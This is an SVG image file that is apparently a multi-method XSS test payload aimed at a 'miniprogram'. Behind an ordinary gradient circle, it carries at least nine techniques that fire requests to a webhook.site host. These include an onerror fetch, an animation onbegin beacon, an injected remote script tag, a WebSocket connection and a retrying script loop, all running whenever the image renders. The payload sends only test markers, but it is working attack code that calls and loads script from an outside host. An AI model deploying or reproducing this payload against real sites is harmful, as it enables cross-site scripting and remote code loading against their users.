<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100" viewBox="0 0 100 100">
  <!-- 正常的SVG外观 -->
  <defs>
    <linearGradient id="grad1" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" style="stop-color:#ff6b6b;stop-opacity:1" />
      <stop offset="100%" style="stop-color:#4ecdc4;stop-opacity:1" />
    </linearGradient>
  </defs>
  <circle cx="50" cy="50" r="40" fill="url(#grad1)"/>
  <text x="50" y="55" text-anchor="middle" fill="white" font-size="12" font-weight="bold">XSS</text>
  
  <!-- 方法1: CSS注入攻击 -->
  <style>
    <![CDATA[
      @import url('https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?css_import=1');
      .xss { background: url('https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?css_bg=1'); }
    ]]>
  </style>
  
  <!-- 方法2: 利用SVG的use元素和外部引用 -->
  <use xlink:href="https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?svg_use=1#icon"/>
  
  <!-- 方法3: 利用SVG的foreignObject绕过限制 -->
  <foreignObject x="0" y="0" width="1" height="1">
    <div xmlns="http://www.w3.org/1999/xhtml">
      <img src="x" onerror="fetch('https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829',{method:'POST',body:'foreignObject_success'}).catch(()=>new Image().src='https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?fo_fallback=1')"/>
      <iframe src="https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?iframe_load=1" width="0" height="0" style="display:none"></iframe>
    </div>
  </foreignObject>
  
  <!-- 方法4: 利用SVG动画的多重触发 -->
  <animateTransform attributeName="transform" type="scale" values="1;1.01;1" dur="0.1s" repeatCount="1"
    onbegin="setTimeout(()=>{try{navigator.sendBeacon('https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829','beacon_test')}catch(e){(new Image()).src='https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?beacon_fail='+e.message}},100)"/>
  
  <!-- 方法5: 利用SVG的metadata和script结合 -->
  <metadata>
    <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
      <rdf:Description rdf:about="https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?metadata=1"/>
    </rdf:RDF>
  </metadata>
  
  <!-- 方法6: 利用SVG的filter效果触发 -->
  <defs>
    <filter id="xssFilter">
      <feImage xlink:href="https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?filter_image=1"/>
    </filter>
  </defs>
  <rect x="0" y="0" width="1" height="1" filter="url(#xssFilter)" opacity="0"/>
  
  <!-- 方法7: 延迟执行的多重备用方案 -->
  <script>
    <![CDATA[
      // 延迟执行策略
      var attempts = 0;
      var maxAttempts = 5;
      
      function tryXSS() {
        attempts++;
        var methods = [
          // 方法A: XMLHttpRequest
          function() {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829');
            xhr.send('xhr_method_' + attempts);
          },
          // 方法B: 动态创建script标签
          function() {
            var s = document.createElement('script');
            s.src = 'https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?script_inject=' + attempts;
            document.head.appendChild(s);
          },
          // 方法C: WebSocket连接
          function() {
            try {
              var ws = new WebSocket('wss://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829');
              ws.onopen = function() { ws.send('websocket_success_' + attempts); };
            } catch(e) {
              (new Image()).src = 'https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?ws_fail=' + attempts;
            }
          },
          // 方法D: 利用postMessage
          function() {
            if (window.parent !== window) {
              window.parent.postMessage('xss_postmessage_' + attempts, '*');
            }
            (new Image()).src = 'https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?postmsg=' + attempts;
          }
        ];
        
        try {
          methods[attempts % methods.length]();
        } catch(e) {
          (new Image()).src = 'https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?method_error=' + attempts + '&msg=' + encodeURIComponent(e.message);
        }
        
        if (attempts < maxAttempts) {
          setTimeout(tryXSS, 1000 * attempts); // 递增延迟
        }
      }
      
      // 立即执行一次，然后延迟执行
      tryXSS();
      setTimeout(tryXSS, 500);
      setTimeout(tryXSS, 2000);
    ]]>
  </script>
  
  <!-- 方法8: 利用SVG的title和desc元素 -->
  <title>XSS Test</title>
  <desc>Advanced XSS payload for miniprogram testing</desc>
  
  <!-- 方法9: 最后的图片请求备用方案 -->
  <image x="0" y="0" width="0" height="0" 
         xlink:href="https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?final_image_fallback=1"/>
</svg>